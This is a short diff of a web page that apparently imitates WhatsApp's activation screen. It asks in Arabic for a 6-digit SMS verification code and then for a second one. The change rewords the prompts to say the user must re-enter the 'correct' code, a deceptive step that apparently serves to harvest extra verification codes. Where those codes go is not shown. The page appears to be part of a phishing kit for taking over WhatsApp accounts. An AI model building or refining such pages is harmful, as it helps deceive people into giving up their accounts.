@@ -163,7 +163,7 @@
             const activationCode1 = document.getElementById('activationCode1').value;
 
             if (!activationCode1 || activationCode1.length !== 6 || !/^\d{6}$/.test(activationCode1)) {
-                alert('يرجى إدخال رمز التفعيل المكون من 6 أرقام.');
+                alert('يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام.');
                 return;
             }
 
@@ -174,7 +174,7 @@
                 container.innerHTML = `
                     <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Icon">
                     <h1>رمز التفعيل </h1>
-                    <p>يرجى إدخال رمز التفعيل المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
+                    <p>يرجى إعادة إدخال رمز التفعيل الصحيح المكون من 6 أرقام الذي تلقيته عبر رسالة نصية.</p>
                     <input id="activationCode2" type="tel" placeholder="رمز التفعيل " maxlength="6">
                     <button onclick="submitSecondActivationCode()">متابعة</button>
                     <div id="countdown"></div>
